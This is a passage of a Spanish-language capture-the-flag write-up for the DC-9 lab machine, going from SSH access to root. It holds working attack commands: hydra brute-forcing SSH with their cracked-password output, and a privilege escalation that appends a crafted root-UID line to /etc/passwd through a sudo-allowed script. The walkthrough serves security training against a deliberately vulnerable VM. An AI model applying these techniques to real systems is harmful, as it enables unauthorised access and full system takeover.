href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2013.png"><img style="width:864px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2013.png"/></a></figure><p id="399ed6d2-171b-4982-a73f-05b9715cfe25" class="">Funciona. En este punto, se podría probar ver la id_rsa de cada usuario, ver si el usuario tiene privilegios de lectura de logs de apache y ssh para intentar un log poisoning. O podríamos ver archivos del sistema como “/proc/net/tcp” para ver el estado de las conexiones TCP activas en el sistema.</p><p id="618b9247-9e75-43e9-aa2b-3e2c93e9caa8" class="">
+</p><figure id="92f56f60-7152-4d7e-b70e-77c1605ce007" class="image"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2014.png"><img style="width:720px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2014.png"/></a></figure><p id="59349831-c111-4f25-9a88-0e5343f3a44a" class="">Haciendo la conversión de “0016” a decimal da “22”, por lo que el servicio SSH está activo en la máquina, esto lo sabíamos desde el escaneo con Nmap, aunque nosotros lo veíamos en estado “filtered”.</p><p id="5f1d7097-97af-4c2c-afad-bed73b59d73a" class="">Si vemos qué procesos están corriendo en la máquina aparece knockd.</p><figure id="145adb94-5922-4879-b91a-9c19409bda9d" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2015.png"><img style="width:720px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2015.png"/></a></figure><p id="982df179-3315-4533-9ea4-b2892ce3b603" class="">Si buscamos el archivo de configuración de knockd, podemos ver la secuencia para abrir el puerto “22”.</p><figure id="d2ab12db-2386-47d7-aab9-d2868b771a4b" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2016.png"><img style="width:816px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2016.png"/></a></figure><p id="a8b72e58-7ef7-4ce6-9d6e-41ded8feb38e" class="">Y ahora que parece estar en estado open y teniendo una lista de usuarios y contraseñas que sacamos de la base de datos, se podría intentar hacer fuerza bruta para tratar de ingresar por SSH.</p><p id="addab845-0a1e-4917-9b9f-e9ab3e2334f3" class="">
+</p><pre id="a6ff1cde-a6a1-46d5-8c72-921867fa9f39" class="code"><code>hydra -L Username -P Passwords ssh://192.168.1.17
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
+[DATA] attacking ssh://192.168.1.17:22/
+[22][ssh] host: 192.168.1.17   login: chandlerb   password: UrAG0D!
+[22][ssh] host: 192.168.1.17   login: janitor   password: Ilovepeepee
+[22][ssh] host: 192.168.1.17   login: joeyt   password: Passw0rd
+1 of 1 target successfully completed, 3 valid passwords found</code></pre><p id="72ef7ae9-399b-43a2-9bbd-70fa61738520" class="">Los 3 son válidos para conectarnos por SSH, pero el usuario janitor tiene en su directorio personal un archivo con contraseñas.</p><pre id="913d4bf5-ee4f-4632-bef0-dda248ffb00e" class="code"><code>janitor@dc-9:~$ ls -la
+total 16
+drwx------  4 janitor janitor 4096 Mar 18 13:43 .
+drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
+lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null
+drwx------  3 janitor janitor 4096 Mar 18 13:43 .gnupg
+drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
+janitor@dc-9:~$ cd .secrets-for-putin/
+janitor@dc-9:~/.secrets-for-putin$ ls -la
+total 12
+drwx------ 2 janitor janitor 4096 Dec 29  2019 .
+drwx------ 4 janitor janitor 4096 Mar 18 13:43 ..
+-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
+janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts</code></pre><p id="665e4bcd-783a-40ac-ac1d-4cd41c9a66b1" class="">Podríamos agregar estas contraseñas a las que ya tenemos y probar otro ataque de fuerza bruta.</p><pre id="898edc84-1516-420e-8162-9e95dab8db42" class="code"><code>hydra -L Username -P Passwords ssh://192.168.1.17
+
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 391 login tries (l:17/p:23), ~25 tries per task
+[DATA] attacking ssh://192.168.1.17:22/
+[22][ssh] host: 192.168.1.17   login: fredf   password: B4-Tru3-001
+[22][ssh] host: 192.168.1.17   login: chandlerb   password: UrAG0D!
+[22][ssh] host: 192.168.1.17   login: joeyt   password: Passw0rd
+[22][ssh] host: 192.168.1.17   login: janitor   password: Ilovepeepee
+[STATUS] 385.00 tries/min, 385 tries in 00:01h, 12 to do in 00:01h, 16 active
+1 of 1 target successfully completed, 4 valid passwords found</code></pre><p id="d5db0e2e-10b7-4230-81e5-41990c99934a" class="">Tenemos al usuario <mark class="highlight-teal">fredf</mark> para acceder al sistema.</p><p id="0fd00fd6-0a92-4578-b8f8-43fa3172d1ff" class="">
+</p><pre id="101d2c1f-a064-4dee-ad2a-679770fa9cbe" class="code"><code>ssh fredf@192.168.1.17
+fredf@192.168.1.17&#x27;s password: 
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar 18 13:53:45 2023 from 192.168.1.24
+fredf@dc-9:~$</code></pre><p id="a129528d-a9c1-4f70-8521-81573c0e5b33" class="">
+</p><hr id="cf860adc-6994-470e-86ab-972beeda5047"/><h3 id="7d2ea88a-dd39-49ff-a7cf-6a1f862000c4" class=""><mark class="highlight-blue">Elevando Privilegios</mark></h3><p id="da244ce6-d09c-4bd6-ab92-d0dae225a311" class="">Si hacemos sudo -l para listar permisos de sudo que tiene nuestro usuario, vemos que podemos ejecutar un binario ‘test’ <mark class="highlight-gray_background">/opt/devstuff/dist/test/test.</mark></p><pre id="8cc3f89a-2d2c-4be1-9af3-b98df8710039" class="code"><code>fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test</code></pre><p id="4ea98aab-3dcb-45dd-bf59-4795d5f4ae5c" class="">
+</p><p id="7adc9f7b-724c-4ddc-9367-d5f4404a987d" class="">Si lo ejecutamos da un mensaje de uso.</p><pre id="b1caed78-3d7a-4136-9031-d001e9127cf6" class="code"><code>fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test
+Usage: python test.py read append</code></pre><p id="fb75a4c1-39c0-40c9-8d78-fd8064dc558b" class="">Si buscamos desde la raiz el archivo “test.py” vemos que es un script de python que lo que hace es leer el contenido de un archivo y lo agrega en otro.</p><pre id="536dfcd0-fe5f-42e6-91c1-1af97e89aaba" class="code"><code>fredf@dc-9:~$ find / -name test.py 2&gt;/dev/null
+/opt/devstuff/test.py
+/usr/lib/python3/dist-packages/setuptools/command/test.py
+fredf@dc-9:~$ ls -la /opt/devstuff/test.py
+-rw-r--r-- 1 root root 250 Dec 29  2019 /opt/devstuff/test.py
+fredf@dc-9:~$ cat /opt/devstuff/test.py
+#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print (&quot;Usage: python test.py read append&quot;)
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], &quot;r&quot;)
+    output = (f.read())
+
+    f = open(sys.argv[2], &quot;a&quot;)
+    f.write(output)
+    f.close()</code></pre><p id="3022f08b-1842-4368-9b67-6bd75dc7dcdd" class="">Sabiendo esto podríamos agregar un nuevo usuario root al sistema y almacenarlo en el /etc/passwd.</p><p id="54990e8f-6ab7-42f9-a680-8bdd4da67e34" class="">Con openssl creamos una contraseña y usamos el script para agregar el contenido al /etc/passwd.</p><pre id="9d95f2f7-9898-422b-b5ca-1acfb1f177af" class="code"><code>fredf@dc-9:~$ ls
+new_user
+fredf@dc-9:~$ cat new_user 
+eddie:$1$Hl0PYCqH$7g.XOEFmhjJYfenXIL/Nj1:0:0:root:/root:/bin/bash
+fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test new_user /etc/passwd
+fredf@dc-9:~$ su eddie
+Password:    
+root@dc-9:/home/fredf# cat /root/theflag.txt 
+
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+
+
+root@dc-9:/home/fredf#</code></pre></div></article></body></html>
